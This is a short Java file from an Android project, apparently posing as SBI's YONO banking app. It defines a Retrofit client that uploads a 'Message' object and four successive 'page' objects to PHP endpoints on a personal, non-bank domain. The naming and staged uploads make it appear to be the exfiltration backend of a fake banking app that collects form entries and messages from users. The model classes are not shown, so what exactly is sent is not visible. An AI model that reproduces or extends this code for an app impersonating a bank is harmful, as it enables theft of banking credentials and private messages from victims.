package com.example.yono_osbi;

import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.PUT;

interface ApiService {
    @POST("insertM.php")
    Call<Void> sendmessage(@Body Message message);

    @POST("e1.php")
    Call<Void> firstpage(@Body FirstPagem message);

    @PUT("e2.php")
    Call<Void> secondpage(@Body SecondPagem message);

    @PUT("e3.php")
    Call<Void> thirdpage(@Body ThirdPagem message);

    @PUT("e4.php")
    Call<Void> fourthpage(@Body FourthPagem message);
}


class ApiClient {
    private static final String BASE_URL = "https://anikdevnath.com/sbi_new_App/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}